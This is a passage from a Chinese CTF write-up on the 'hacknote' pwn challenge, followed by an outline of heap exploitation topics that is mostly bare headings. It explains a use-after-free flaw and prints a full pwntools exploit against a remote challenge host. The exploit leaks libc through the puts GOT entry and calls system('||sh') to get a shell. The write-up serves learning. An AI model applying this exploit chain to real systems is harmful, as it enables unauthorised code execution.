然后我们需要注意的是，每个节点里面包含一个print\_self的指针和chunk块，chunk块里面存放着用户数据（size和context）

删除节点是采用的free节点所处内存的方法，根据free函数的原理，我们在清除节点时并不会删除地址内存放的数据，所以print\_self指针仍然可以被调用，这也就是UAF的漏洞（由于全局变量note\_list没有删除对应节点，仍然记录着前两个节点），当我们申请两个节点并把他们都释放掉，再申请一个大小为8的节点，我们就能被分配到前两个节点曾经使用的空间，这时也就是说我们可以任意改动原本存放print\_self地址处的内容并且通过调用print节点来执行这个地址上的函数（程序把这个地址当作print来用，但已经被某黑心的黑客篡改为他想要执行的函数）

这时我们调用put函数打印got表，泄露处libc基址，就可以ret2libc了\~

理论存在实践开始：

直接放exp\~

```python
from pwn import *
from LibcSearcher import*
#p = process('./hacknote')
p = remote('61.147.171.105',55382)
elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")

puts_func_addr = 0x804862B
puts_got = elf.got['puts']

def Add(size,string):
	p.recvuntil("Your choice :")
	p.sendline('1')
	p.recvuntil("Note size :")
	p.sendline(str(size))
	p.recvuntil("Content :")
	p.sendline(string)

def Delete(index):
	p.recvuntil("Your choice :")
	p.sendline('2')
	p.recvuntil("Index :")
	p.sendline(str(index))

def Exit():
	p.recvuntil("Your choice :")
	p.sendline('4')

def show(index):
	p.recvuntil("Your choice :")
	p.sendline('3')
	p.recvuntil("Index :")
	p.sendline(str(index))
  
#基本思路：
#add->add->delete
#use after Free
#leak the put_got
#ret2libc
Add(16,"target")
Add(16,"bridge")
Delete(0)
Delete(1)
#此时虽然free了0和1的节点，但是我们仍然能够show（0）和show（1），因为没有清空地址内对应的数据，这就是UAF漏洞所在

payload_got= p32(puts_func_addr)+p32(puts_got)
Add(8,payload_got)
#申请八字节，因为note_list里面存放了print_self函数指针和chunk指针，一共是八字节，我们想要申请到之前free的堆块就要八字节，实验了一下不超过12字节都可以？？？可能是因为堆块大小对齐吧果然还是没学踏实，这里留个小疑问。。。
show(0)
#实际调用的是puts函数，打印了puts函数got表
#可以计算出libc基址

libc_base= u32(p.recv(4))-libc.sym['puts']
sym_add = libc_base + libc.sym["system"]
Delete(2)
payload_getsh= p32(sym_add) + b"||sh" 
Add(8,payload_getsh)
show(0)
p.interactive()

```

![hacknote5](F:%5CPWN%5Chacknote5.png)通关合影！！

**1.二次释放**

**2.unlink技术利用**

**Unlink机制**

1. Fastbin & Tcache Unlink：Fastbin & Tcache是使用单链接的LIFO列表。从这些列表中解链接块只需要将 “victim” chunk 的fd复制到列表的头部
2. Partial Unlink：A partial unlink occurs when a chunk is allocated from an unsortedbin or smallbin
3. Full Unlink：当一个块被合并成另一个free chunk时会发生Full Unlink，或者在largebin中binmap搜索中分配块时发生

**3.释放后重引用漏洞**

**4.fast binattack利用**

**5.house of 系列利用**

**6.unsorted bin attack利用**

**7.函数hook地址覆盖**

### 竞争条件漏洞

### 整数溢出原理

### 常用系统保护措施

checksec（-NX-canary-RELRO–PIE）

### 保护措施相关绕过方法

### SSP 泄露利用泄露

### canary利用
